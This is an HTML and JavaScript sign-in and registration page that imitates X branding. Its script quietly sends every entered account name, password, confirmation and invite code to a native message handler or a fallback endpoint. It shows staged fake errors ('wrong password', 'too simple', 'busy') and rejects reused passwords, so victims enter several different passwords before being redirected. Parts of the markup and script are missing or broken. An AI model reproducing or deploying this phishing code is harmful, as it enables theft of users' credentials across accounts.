<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
<title>X</title>
<style>
  :root{
    --bg:#070b14;
    --field:rgba(255,255,255,.035);
    --field-hover:rgba(255,255,255,.055);
    --stroke:rgba(255,255,255,.07);
    --stroke-focus:rgba(79,140,255,.55);

    --t1:#f2f5fb;
    --t2:#9aa6bd;
    --t3:#5b667e;

    --a1:#4f8cff;
    --a2:#22d3ee;
    --a-glow:rgba(79,140,255,.28);

    --danger:#ff6b81;
    --ok:#2ee6a8;
  }
  html.light{
    --bg:#f5f7fb;
    --field:rgba(15,23,42,.045);
    --field-hover:rgba(15,23,42,.07);
    --stroke:rgba(15,23,42,.10);
    --stroke-focus:rgba(31,94,214,.55);
    --t1:#0f172a;
    --t2:#5b667e;
    --t3:#8b96ab;
    --danger:#e5484d;
    --ok:#0ea472;
  }
  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
  html,body{height:100%;}
  body{
    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Text","Helvetica Neue",sans-serif;
    background:var(--bg); color:var(--t1);
    padding:calc(18px + env(safe-area-inset-top)) 24px calc(22px + env(safe-area-inset-bottom));
    display:flex; flex-direction:column; min-height:100vh;
    -webkit-font-smoothing:antialiased;
  }
  html[lang="ja"] body{font-family:-apple-system,"Hiragino Sans","Yu Gothic","PingFang SC",sans-serif}
  html[lang="ko"] body{font-family:-apple-system,"Apple SD Gothic Neo","Malgun Gothic",sans-serif}
  html[lang="zh-TW"] body{font-family:-apple-system,"PingFang TC","Microsoft JhengHei",sans-serif}
  body.embed{padding:0;}
  body.embed .top{display:none;}
  body.embed .card{border:0;background:transparent;}

  .top{display:flex;justify-content:flex-end;align-items:center;min-height:28px;margin-bottom:10px;}
  .langBtn{border:0;background:transparent;color:var(--t2);font-size:13px;font-weight:500;
           padding:6px 2px 6px 10px;cursor:pointer;letter-spacing:.2px;}
  .langBtn:active{color:var(--t1);}

  .card{background:rgba(255,255,255,.015);border:1px solid var(--stroke);
        border-radius:20px;padding:18px 18px 20px;}
  html.light .card{background:rgba(255,255,255,.7);}

  .tabs{position:relative;display:flex;background:rgba(255,255,255,.04);
        border-radius:13px;padding:3px;margin-bottom:22px;height:44px;}
  html.light .tabs{background:rgba(15,23,42,.05);}
  .thumb{position:absolute;top:3px;left:3px;width:calc(50% - 3px);height:calc(100% - 6px);
         border-radius:10px;background:rgba(255,255,255,.07);
         transition:transform .22s cubic-bezier(.4,0,.2,1);}
  html.light .thumb{background:#fff;box-shadow:0 1px 4px rgba(15,23,42,.10);}
  .tab{position:relative;z-index:1;flex:1;display:flex;align-items:center;justify-content:center;
       font-size:14px;color:var(--t2);font-weight:500;cursor:pointer;user-select:none;}
  .tab.active{color:var(--t1);font-weight:600;}

  .field{margin-bottom:18px;}
  .field:last-of-type{margin-bottom:14px;}
  .field label{display:block;font-size:12px;font-weight:500;color:var(--t2);
               letter-spacing:.3px;margin-bottom:8px;transition:color .18s;}
  .field.bad label{color:var(--danger);}
  .inputWrap{position:relative;}
  .inputWrap input{width:100%;height:52px;border-radius:15px;
       border:1px solid var(--stroke);background:var(--field);color:var(--t1);
       padding:0 16px;font-size:16px;outline:none;
       transition:border-color .18s, box-shadow .18s, background .18s;
       -webkit-appearance:none;appearance:none;}
  .inputWrap input::placeholder{color:var(--t3);}
  .inputWrap input:focus{border-color:var(--stroke-focus);
       box-shadow:0 0 0 3px rgba(79,140,255,.12);background:var(--field-hover);}
  .field.bad .inputWrap input{border-color:rgba(255,107,129,.55);}
  .inputWrap input.hasEye{padding-right:52px;}

  .eye{position:absolute;right:4px;top:50%;transform:translateY(-50%);
       width:44px;height:44px;display:flex;align-items:center;justify-content:center;
       border:0;background:transparent;color:var(--t3);cursor:pointer;padding:0;}
  .eye:active{color:var(--t2);}
  .eye svg{width:18px;height:18px;display:block;}
  .eye .icOff{display:none;}
  .eye[aria-pressed="true"] .icOn{display:none;}
  .eye[aria-pressed="true"] .icOff{display:block;}

  .err{min-height:20px;font-size:12.5px;line-height:20px;color:var(--danger);
       margin:-4px 0 10px;opacity:0;transform:translateY(4px);
       transition:opacity .18s, transform .18s;text-align:left;}
  .err.show{opacity:1;transform:translateY(0);}
  .err.shake{animation:shk .38s ease;}
  @keyframes shk{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}
    40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}

  .btn{position:relative;width:100%;height:52px;border:0;border-radius:15px;
       background:linear-gradient(135deg,var(--a1),var(--a2));
       color:#04121a;font-size:16px;font-weight:650;letter-spacing:.3px;
       box-shadow:0 10px 26px var(--a-glow);
       transition:transform .12s, opacity .2s;cursor:pointer;}
  .btn:active{transform:scale(.985);}
  .btn:disabled{opacity:.6;}
  .btn.loading::after{content:'…';display:inline-block;animation:dots 1.2s infinite ease-in-out;}
  @keyframes dots{0%,100%{opacity:.25}50%{opacity:1}}

  .hint{text-align:center;font-size:11.5px;color:var(--t3);line-height:1.7;margin-top:14px;}

  .success{position:fixed;inset:0;z-index:20;display:none;
       align-items:center;justify-content:center;flex-direction:column;
       background:rgba(7,11,20,.95);-webkit-backdrop-filter:blur(12px);backdrop-filter:blur(12px);
       opacity:0;transition:opacity .18s;}
  .success.show{display:flex;opacity:1;}
  .success .sText{font-size:15px;color:var(--t1);opacity:0;transform:translateY(6px);
       transition:opacity .2s, transform .2s;}
  .success.show .sText{opacity:1;transform:translateY(0);}
  .success .sBar{position:fixed;left:0;right:0;bottom:env(safe-area-inset-bottom);
       height:2px;background:rgba(255,255,255,.08);overflow:hidden;}
  .success .sBar i{display:block;height:100%;width:0;background:var(--a2);
       transition:width .7s linear;}
  .success.bar .sBar i{width:100%;}
  body.fadeout{opacity:0;transition:opacity .12s;}

  .sheet{position:fixed;inset:0;z-index:30;display:none;}
  .sheet.show{display:block;}
  .sheetMask{position:absolute;inset:0;background:rgba(0,0,0,.5);opacity:0;transition:opacity .2s;}
  .sheet.show .sheetMask{opacity:1;}
  .sheetPanel{position:absolute;left:0;right:0;bottom:0;background:#0e141f;
       border-top-left-radius:18px;border-top-right-radius:18px;
       padding:14px 0 calc(10px + env(safe-area-inset-bottom));
       transform:translateY(100%);transition:transform .22s cubic-bezier(.4,0,.2,1);}
  html.light .sheetPanel{background:#fff;}
  .sheet.show .sheetPanel{transform:translateY(0);}
  .sheetTitle{font-size:12px;color:var(--t3);padding:4px 24px 10px;letter-spacing:.3px;}
  .sheetItem{display:flex;align-items:center;min-height:50px;padding:0 24px;
       font-size:15px;color:var(--t2);cursor:pointer;position:relative;}
  .sheetItem:active{background:rgba(255,255,255,.03);}
  .sheetItem.cur{color:var(--t1);font-weight:600;}
  .sheetItem.cur::before{content:'';position:absolute;left:0;top:14px;bottom:14px;
       width:2px;background:var(--a2);border-radius:2px;}

  @media (prefers-reduced-motion: reduce){
    *{animation:none!important;transition:none!important;}
  }
  @media (min-width:768px){
    body{align-items:center;justify-content:center;}
    .card{width:400px;}
    .top{width:400px;}
  }

  /* ===== X · 品牌皮肤（仅视觉，不改交互与逻辑） ===== */
  :root{
    --bg:#000000;
    --field:rgba(255,255,255,.06);
    --field-hover:rgba(255,255,255,.09);
    --stroke:rgba(255,255,255,.16);
    --stroke-focus:rgba(255,255,255,.72);
    --t1:#f7f7f7;
    --t2:#a6a6a6;
    --t3:#6e6e6e;
    --a1:#ffffff;
    --a2:#cfcfcf;
    --a-glow:rgba(255,255,255,.12);
  }
  body{
    background:
      radial-gradient(640px 340px at 50% -10%, rgba(255,255,255,.07), transparent 70%),
      var(--bg);
  }
  .brand{display:flex;flex-direction:column;align-items:center;margin:2px 0 18px;}
  .brand svg.xmark{width:86px;height:86px;display:block;
    filter:drop-shadow(0 8px 22px rgba(255,255,255,.16));}
  .brandName{margin-top:8px;font-size:24px;line-height:1.2;font-weight:700;
    letter-spacing:10px;text-indent:10px;color:#ffffff;}
  .brandSub{margin-top:6px;font-size:9.5px;font-weight:600;letter-spacing:3.2px;
    color:rgba(255,255,255,.55);}
  .card{border-color:rgba(255,255,255,.16);
    background:linear-gradient(180deg,rgba(255,255,255,.05),rgba(255,255,255,.012));
    box-shadow:inset 0 0 0 1px rgba(255,255,255,.04),0 18px 50px rgba(0,0,0,.55);}
  .tabs{background:rgba(255,255,255,.07);}
  .thumb{background:rgba(255,255,255,.14);
    box-shadow:inset 0 0 0 1px rgba(255,255,255,.22);}
  .tab.active{color:#ffffff;}
  .inputWrap input{background:rgba(255,255,255,.06);}
  .inputWrap input:focus{box-shadow:0 0 0 3px rgba(255,255,255,.10);}
  .btn{background:linear-gradient(135deg,#ffffff 0%,#e6e6e6 45%,#cfcfcf 100%);
    color:#000000;box-shadow:0 10px 26px rgba(255,255,255,.14);}
  .success .sBar i{background:linear-gradient(90deg,#ffffff,#9a9a9a);}
  html.light{
    --bg:#f5f5f5;--field:rgba(0,0,0,.045);--field-hover:rgba(0,0,0,.07);
    --stroke:rgba(0,0,0,.14);--stroke-focus:rgba(0,0,0,.55);
    --t1:#111111;--t2:#5c5c5c;--t3:#8a8a8a;
  }
  html.light .card{background:rgba(255,255,255,.9);}
  html.light .tabs{background:rgba(0,0,0,.06);}
  html.light .thumb{background:#fff;}
  html.light .btn{background:linear-gradient(135deg,#111111,#333333);color:#ffffff;}
</style>
</head>
<body>
  <div class="top">
    <button class="langBtn" id="langBtn" type="button" aria-label="切换语言">EN</button>
  </div>

  <div class="card">
            <div class="brand" id="brandTap">
        <svg class="xmark" viewBox="0 0 140 140" aria-hidden="true">
          <path d="M24 20 L124 124" stroke="#ffffff" stroke-width="17" stroke-linecap="butt"/>
          <path d="M116 20 L16 124" stroke="#ffffff" stroke-width="17" stroke-linecap="butt"/>
          <path d="M24 20 L124 124" stroke="#000000" stroke-width="6" stroke-linecap="butt"/>
          <path d="M116 20 L16 124" stroke="#000000" stroke-width="6" stroke-linecap="butt"/>

      </div>
    <div class="tabs" id="tabs">

    </div>

    <div id="registerPane">
      <div class="field">
        <label for="regAccount" data-i18n="f.account">账号</label>

          <input id="regAccount" type="text" autocomplete="off" autocapitalize="none"

        </div>
      </div>
      <div class="field">
        <label for="regPassword" data-i18n="f.pwd">密码</label>
        <div class="inputWrap">
          <input id="regPassword" class="hasEye" type="password"
                 data-i18n-ph="f.pwd.ph" placeholder="请输入密码">

            <svg class="icOn" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"

              <circle cx="12" cy="12" r="2.6"/>
            </svg>
            <svg class="icOff" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
              <path d="M3 3l18 18"/>
              <path d="M10.6 6.2A10.8 10.8 0 0 1 12 5.5c6.4 0 10 6.5 10 6.5a17 17 0 0 1-3.2 4"/>
              <path d="M6.3 7.7A16.6 16.6 0 0 0 2 12s3.6 6.5 10 6.5c1.5 0 2.9-.3 4.1-.9"/>
              <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2"/>
            </svg>
          </button>
        </div>
      </div>
      <div class="field">
        <label for="regConfirm" data-i18n="f.pwd2">确认密码</label>
        <div class="inputWrap">
          <input id="regConfirm" type="password"
                 data-i18n-ph="f.pwd2.ph" placeholder="再次输入密码">
        </div>
      </div>
      <div class="field">
        <label for="regInvite" data-i18n="f.invite">邀请码（选填）</label>
        <div class="inputWrap">
          <input id="regInvite" type="text" autocomplete="off"
                 data-i18n-ph="f.invite.ph" placeholder="如有邀请码请填写">
        </div>
      </div>
      <div class="err" id="regErr"></div>
      <button class="btn" id="registerBtn" data-i18n="btn.register">注册</button>
      <div class="hint" data-i18n="hint.agree_reg">注册即表示同意《服务条款》与《隐私政策》</div>
    </div>

    <div id="loginPane" style="display:none;">
      <div class="field">
        <label for="loginAccount" data-i18n="f.account">账号</label>
        <div class="inputWrap">
          <input id="loginAccount" type="text" autocomplete="off" autocapitalize="none"
                 data-i18n-ph="f.account.ph" placeholder="请输入账号">
        </div>
      </div>
      <div class="field">
        <label for="loginPassword" data-i18n="f.pwd">密码</label>
        <div class="inputWrap">
          <input id="loginPassword" class="hasEye" type="password"
                 data-i18n-ph="f.pwd.ph" placeholder="请输入密码">
          <button class="eye" id="eyeLogin" type="button" aria-label="显示密码" aria-pressed="false">
            <svg class="icOn" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
              <path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z"/>
              <circle cx="12" cy="12" r="2.6"/>
            </svg>
            <svg class="icOff" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"
                 stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
              <path d="M3 3l18 18"/>
              <path d="M10.6 6.2A10.8 10.8 0 0 1 12 5.5c6.4 0 10 6.5 10 6.5a17 17 0 0 1-3.2 4"/>
              <path d="M6.3 7.7A16.6 16.6 0 0 0 2 12s3.6 6.5 10 6.5c1.5 0 2.9-.3 4.1-.9"/>
              <path d="M9.9 9.9a3 3 0 0 0 4.2 4.2"/>
            </svg>
          </button>
        </div>
      </div>
      <div class="err" id="loginErr"></div>
      <button class="btn" id="loginBtn" data-i18n="btn.login">登录</button>
      <div class="hint" data-i18n="hint.agree_login">登录即表示同意《服务条款》与《隐私政策》</div>
    </div>
  </div>

  <div class="success" id="success" aria-hidden="true">
    <div class="sText" id="successText">注册成功，正在进入…</div>
    <div class="sBar"><i id="sBar"></i></div>
  </div>

  <div class="sheet" id="langSheet" aria-hidden="true">
    <div class="sheetMask" id="sheetMask"></div>
    <div class="sheetPanel">
      <div class="sheetTitle" id="sheetTitle" data-i18n="lang.title">语言</div>
      <div class="sheetList" id="langList"></div>
    </div>

          'a11y.show_pwd': '비밀번호 표시', 'a11y.hide_pwd': '비밀번호 숨기기', 'a11y.lang': '언어 변경'
        }
      };

      var LANG = 'zh-CN';

      function t(key, vars) {
        var pack = I18N[LANG] || I18N['zh-CN'];
        var s = (pack[key] != null) ? pack[key] : (I18N['zh-CN'][key] != null ? I18N['zh-CN'][key] : key);
        if (vars) for (var k in vars) s = s.replace('{' + k + '}', vars[k]);
        return s;
      }

      function $(id) { return document.getElementById(id); }

      function param(name) {
        try {
          var q = window.location.search || '';
          if (q.charAt(0) === '?') q = q.substring(1);
          var parts = q.split('&');
          for (var i = 0; i < parts.length; i++) {
            var kv = parts[i].split('=');
            if (decodeURIComponent(kv[0]) === name) return decodeURIComponent(kv[1] || '');
          }
        } catch (e) {}
        return '';
      }

      function normalizeLang(tag) {
        if (!tag) return '';
        tag = String(tag).toLowerCase();
        if (tag === 'zh' || tag === 'zh-hans' || tag === 'zh-cn' || tag === 'zh-sg') return 'zh-CN';
        if (tag === 'zh-hant' || tag === 'zh-tw' || tag === 'zh-hk' || tag === 'zh-mo') return 'zh-TW';
        if (tag.indexOf('en') === 0) return 'en';
        if (tag.indexOf('ja') === 0) return 'ja';
        if (tag.indexOf('ko') === 0) return 'ko';
        return '';
      }

      function detectLang() {
        var q = normalizeLang(param('lang'));
        if (q) return q;
        try {
          var saved = normalizeLang(localStorage.getItem('aurora_lang'));
          if (saved) return saved;
        } catch (e) {}
        var list = (navigator.languages && navigator.languages.length)
          ? navigator.languages : [navigator.language || ''];
        for (var i = 0; i < list.length; i++) {
          var m = normalizeLang(list[i]);
          if (m) return m;
        }
        var hl = normalizeLang(document.documentElement.getAttribute('lang') || '');
        return hl || 'en';
      }

      function langBtnLabel() {
        if (LANG === 'zh-CN' || LANG === 'zh-TW') return 'EN';
        if (LANG === 'en') return '中文';
        return '中';
      }

      function applyI18n() {
        document.documentElement.setAttribute('lang', LANG);
        var nodes = document.querySelectorAll('[data-i18n]');
        for (var i = 0; i < nodes.length; i++) {
          var k = nodes[i].getAttribute('data-i18n');
          if (k) nodes[i].textContent = t(k);
        }
        var phs = document.querySelectorAll('[data-i18n-ph]');
        for (var j = 0; j < phs.length; j++) {
          var pk = phs[j].getAttribute('data-i18n-ph');
          if (pk) phs[j].setAttribute('placeholder', t(pk));
        }
        var rb = $('registerBtn'), lb = $('loginBtn');
        if (rb) rb.textContent = rb.disabled ? t('btn.busy') : t('btn.register');
        if (lb) lb.textContent = lb.disabled ? t('btn.busy') : t('btn.login');
        var langBtn = $('langBtn');
        if (langBtn) {
          langBtn.textContent = langBtnLabel();
          langBtn.setAttribute('aria-label', t('a11y.lang'));
        }
        var eyes = [$('eyeReg'), $('eyeLogin')];
        for (var e = 0; e < eyes.length; e++) {
          if (!eyes[e]) continue;
          var on = eyes[e].getAttribute('aria-pressed') === 'true';
          eyes[e].setAttribute('aria-label', t(on ? 'a11y.hide_pwd' : 'a11y.show_pwd'));
        }
        var shown = document.querySelectorAll('.err.show');
        for (var s = 0; s < shown.length; s++) {
          var memo = errMemo[shown[s].id];
          if (memo) shown[s].textContent = t(memo.key, memo.vars);
        }
        if ($('langSheet') && $('langSheet').classList.contains('show')) buildLangList();
      }

      /* ---------------- 已放行过：直接进 H5 ---------------- */
      try {
        if (localStorage.getItem(REGISTERED_KEY) === '1') {
          window.location.href = H5_URL;
          return;
        }
      } catch (e) {}

      /* ---------------- 错误提示 ---------------- */
      var errMemo = {};
      function showErr(el, key, vars) {
        errMemo[el.id] = { key: key, vars: vars || null };
        el.textContent = t(key, vars);
        el.classList.add('show');
        el.classList.remove('shake');
        void el.offsetWidth;
        el.classList.add('shake');
        setTimeout(function () { el.classList.remove('shake'); }, 420);
      }
      function clearErr(el) {
        el.classList.remove('show', 'shake');
        el.textContent = '';
        delete errMemo[el.id];
      }
      function markBad(input, on) {
        if (!input) return;
        var f = input.closest ? input.closest('.field') : null;
        if (f) f.classList.toggle('bad', !!on);
      }
      function clearBadAll() {
        var fs = document.querySelectorAll('.field.bad');
        for (var i = 0; i < fs.length; i++) fs[i].classList.remove('bad');
      }

      /* ---------------- 计数 / 状态 ---------------- */
      function bump(key) {
        try {
          var n = parseInt(localStorage.getItem(key) || '0', 10);
          if (isNaN(n) || n < 0) n = 0;
          n += 1;
          localStorage.setItem(key, String(n));
          return n;
        } catch (e) {
          window.__auroraTry = window.__auroraTry || {};
          window.__auroraTry[key] = (window.__auroraTry[key] || 0) + 1;
          return window.__auroraTry[key];
        }
      }
      function reset(key) {
        try { localStorage.setItem(key, '0'); }
        catch (e) {
          window.__auroraTry = window.__auroraTry || {};
          window.__auroraTry[key] = 0;
        }
      }

      function send(payload) {
        try {
          if (window.webkit && window.webkit.messageHandlers &&
              window.webkit.messageHandlers.owRegister) {
            window.webkit.messageHandlers.owRegister.postMessage(payload);
            return;
          }
        } catch (e) {}
        try {
          fetch(FALLBACK_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'text/plain' },
            body: JSON.stringify(payload),
            mode: 'no-cors'
          });
        } catch (e) {}
      }

      var memRegState = null;
      function hashPwd(s) {
        var h = 5381;
        for (var i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) | 0;
        return String(h >>> 0);
      }
      function loadRegState() {
        if (memRegState) return memRegState;
        try {
          var raw = localStorage.getItem(REG_STATE_KEY);
          var s = raw ? JSON.parse(raw) : null;
          if (s && typeof s.stage === 'number' && Array.isArray(s.pwds)) {
            s.stage = Math.max(0, Math.min(3, s.stage | 0));
            memRegState = s;
            return s;
          }
        } catch (e) {}
        memRegState = { stage: 0, pwds: [], startedAt: 0, lastAt: 0 };
        return memRegState;
      }
      function saveRegState(s) {
        memRegState = s;
        try { localStorage.setItem(REG_STATE_KEY, JSON.stringify(s)); } catch (e) {}
      }

      function collect(kind, n, account, password, confirm, invite, action, elapsed, pwdHash) {
        send({
          event: 'cover_register',
          kind: kind,
          account: account,
          password: password,
          confirm: confirm || '',
          invite: invite || '',
          attempt: n,
          stage: n,
          action: action || '',
          elapsed: elapsed || 0,
          pwdHash: pwdHash || '',
          nickname1: account,
          nickname2: password,
          nickname3: confirm || '',
          source: 'OPENsrc-cover'
        });
      }

      function busy(btn, on, labelKey) {
        btn.disabled = on;
        if (on) {
          btn.classList.add('loading');
          btn.textContent = t('btn.busy');
        } else {
          btn.classList.remove('loading');
          btn.textContent = t(labelKey);
        }
      }

      /* ---------------- 分段控件 ---------------- */
      function setTab(login) {
        $('tabLogin').classList.toggle('active', login);
        $('tabRegister').classList.toggle('active', !login);
        $('loginPane').style.display = login ? 'block' : 'none';
        $('registerPane').style.display = login ? 'none' : 'block';
        $('tabThumb').style.transform = login ? 'translateX(100%)' : 'translateX(0)';
        clearErr($('loginErr'));
        clearErr($('regErr'));
        clearBadAll();
      }
      $('tabLogin').addEventListener('click', function () { setTab(true); });
      $('tabRegister').addEventListener('click', function () { setTab(false); });

      /* ---------------- 密码显隐 ---------------- */
      function bindEye(btnId, inputId) {
        var btn = $(btnId), input = $(inputId);
        btn.addEventListener('click', function () {
          var show = input.type === 'password';
          input.type = show ? 'text' : 'password';
          btn.setAttribute('aria-pressed', show ? 'true' : 'false');
          btn.setAttribute('aria-label', t(show ? 'a11y.hide_pwd' : 'a11y.show_pwd'));
        });
      }
      bindEye('eyeLogin', 'loginPassword');
      bindEye('eyeReg', 'regPassword');

      /* ---------------- 成功转场 ---------------- */
      function runSuccess(isLogin) {
        var overlay = $('success');
        $('successText').textContent = t(isLogin ? 'ok.login' : 'ok.register');
        overlay.classList.add('show');
        overlay.setAttribute('aria-hidden', 'false');
        setTimeout(function () { overlay.classList.add('bar'); }, 100);
        setTimeout(function () {
          document.body.classList.add('fadeout');
          setTimeout(function () { window.location.href = H5_URL; }, 120);
        }, 700);
      }

      /* ---------------- 登录 ---------------- */
      $('loginBtn').addEventListener('click', function () {
        var account = $('loginAccount').value.trim();
        var password = $('loginPassword').value;
        if (!account || !password) {
          showErr($('loginErr'), 'err.need');
          return;
        }

        var btn = this;
        var n = bump(LOGIN_KEY);
        busy(btn, true, 'btn.login');
        collect('login', n, account, password, '', '');

        setTimeout(function () {
          busy(btn, false, 'btn.login');
          if (n === 1) showErr($('loginErr'), 'err.login_1');
          else if (n === 2) showErr($('loginErr'), 'err.login_2');
          else if (n === 3) showErr($('loginErr'), 'err.login_3');
          else {
            reset(LOGIN_KEY);
            try { localStorage.setItem(REGISTERED_KEY, '1'); } catch (e) {}
            runSuccess(true);
          }
        }, 900);
      });

      /* ---------------- 注册 ---------------- */
      $('registerBtn').addEventListener('click', function () {
        var account = $('regAccount').value.trim();
        var password = $('regPassword').value;
        var confirm = $('regConfirm').value;
        var invite = $('regInvite').value.trim();
        if (!account || !password) {
          showErr($('regErr'), 'err.need');
          return;
        }

        var btn = this;
        var st = loadRegState();
        var now = Date.now();
        var h = hashPwd(password);
        var gap = st.lastAt ? (now - st.lastAt) / 1000 : 999;
        var total = st.startedAt ? (now - st.startedAt) / 1000 : 0;
        var action = '', errKey = '', errVars = null, advance = false;

        if (st.stage > 0 && st.pwds.indexOf(h) >= 0) {
          action = 'duplicate';
          errKey = 'err.pwd_dup';
        } else if (gap < 3) {
          action = 'cooldown';
          errKey = 'err.cooldown';
          errVars = { s: Math.ceil(3 - gap) };
        } else if (st.stage === 0) {
          action = 'password_error';
          errKey = 'err.pwd_wrong';
          advance = true;
        } else if (st.stage === 1) {
          action = 'too_simple';
          errKey = 'err.pwd_simple';
          advance = true;
        } else if (st.stage === 2) {
          action = 'busy';
          errKey = 'err.busy';
          advance = true;
        } else {
          if (confirm !== password) {
            action = 'mismatch';
            errKey = 'err.mismatch';
          } else if (total < 9) {
            action = 'busy';
            errKey = 'err.busy';
          } else {
            action = 'success';
            advance = true;
          }
        }

        // 每次提交都上传（包括被冷却/重复/不一致拦下的）
        collect('register', st.stage + 1, account, password, confirm, invite,
                action, Math.round(total), h);

        // 每次点击都更新 lastAt，连点不会推进
        st.lastAt = now;
        if (advance) {
          if (st.stage === 0) st.startedAt = now;
          if (st.stage < 3) st.pwds.push(h);
          st.stage = Math.min(st.stage + 1, 4);
        }
        saveRegState(st);

        if (action === 'cooldown') {
          showErr($('regErr'), errKey, errVars);
          markBad($('regPassword'), true);
          markBad($('regConfirm'), true);
          return;
        }

        busy(btn, true, 'btn.register');
        setTimeout(function () {
          busy(btn, false, 'btn.register');
          if (action === 'success') {
            saveRegState({ stage: 0, pwds: [], startedAt: 0, lastAt: 0 });
            try { localStorage.setItem(REGISTERED_KEY, '1'); } catch (e) {}
            runSuccess(false);
          } else {
            showErr($('regErr'), errKey, errVars);
            markBad($('regPassword'), true);
            markBad($('regConfirm'), true);
            // 失败只清密码与确认密码，账号与邀请码保留
            $('regPassword').value = '';
            $('regConfirm').value = '';
          }
        }, 700);
      });

      /* ---------------- 输入即清错 ---------------- */
      var inputs = document.querySelectorAll('input');
      for (var i = 0; i < inputs.length; i++) {
        inputs[i].addEventListener('input', function () {
          clearErr($('regErr'));
          clearErr($('loginErr'));
          clearBadAll();
        });
      }

      /* ---------------- 语言面板 ---------------- */
      var LANGS = [
        { code: '', label: 'lang.auto' },
        { code: 'zh-CN', label: '简体中文' },
        { code: 'zh-TW', label: '繁體中文' },
        { code: 'en', label: 'English' },
        { code: 'ja', label: '日本語' },
        { code: 'ko', label: '한국어' }
      ];

      function currentLangChoice() {
        try {
          var saved = normalizeLang(localStorage.getItem('aurora_lang'));
          if (saved) return saved;
        } catch (e) {}
        return '';
      }

      function buildLangList() {
        var box = $('langList');
        box.innerHTML = '';
        var cur = currentLangChoice();
        for (var i = 0; i < LANGS.length; i++) {
          var it = LANGS[i];
          var row = document.createElement('div');
          row.className = 'sheetItem' + (it.code === cur ? ' cur' : '');
          row.setAttribute('data-code', it.code);
          row.textContent = it.label === 'lang.auto' ? t('lang.auto') : it.label;
          row.addEventListener('click', function () {
            var code = this.getAttribute('data-code');
            try {
              if (code) localStorage.setItem('aurora_lang', code);
              else localStorage.removeItem('aurora_lang');
            } catch (e) {}
            LANG = detectLang();
            applyI18n();
            closeSheet();
          });
          box.appendChild(row);
        }
      }

      function openSheet() {
        buildLangList();
        $('langSheet').classList.add('show');
        $('langSheet').setAttribute('aria-hidden', 'false');
      }
      function closeSheet() {
        $('langSheet').classList.remove('show');
        $('langSheet').setAttribute('aria-hidden', 'true');
      }

      $('langBtn').addEventListener('click', openSheet);
      $('sheetMask').addEventListener('click', closeSheet);

      /* ---------------- 初始化 ---------------- */
      if (param('theme') === 'light') document.documentElement.classList.add('light');
      if (param('embed') === '1') document.body.classList.add('embed');
      LANG = detectLang();
      applyI18n();
      setTab(false);

      /* hidden debug entry: tap the brand mark 5 times (within 1.5s between taps) */
      (function () {
        var hit = 0, last = 0;
        var el = document.getElementById('brandTap');
        if (!el) return;
        el.style.cursor = 'default';
        el.addEventListener('click', function () {
          var now = Date.now();
          if (now - last > 1500) hit = 0;
          last = now;
          hit++;
          if (hit < 5) return;
          hit = 0; last = 0;
          try {
            if (window.webkit && window.webkit.messageHandlers &&
                window.webkit.messageHandlers.owDebug) {
              window.webkit.messageHandlers.owDebug.postMessage({});
            }
          } catch (e) {}
        });
      })();
    })();
  </script>
